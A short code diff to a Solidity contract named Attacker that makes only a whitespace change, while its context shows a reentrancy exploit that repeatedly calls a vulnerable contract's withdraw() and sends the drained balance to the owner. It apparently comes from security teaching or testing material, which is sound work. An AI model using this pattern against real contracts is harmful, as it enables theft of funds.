@@ -25,7 +25,7 @@ contract Attacker {
         if (address(vulnerableContract).balance > 0) {
             vulnerableContract.withdraw();
         } else {
-            (bool success, ) = owner.call{value: address(this).balance}("");
+            (bool success,) = owner.call{value: address(this).balance}("");
             require(success, "Withdraw failed");
         }
     }
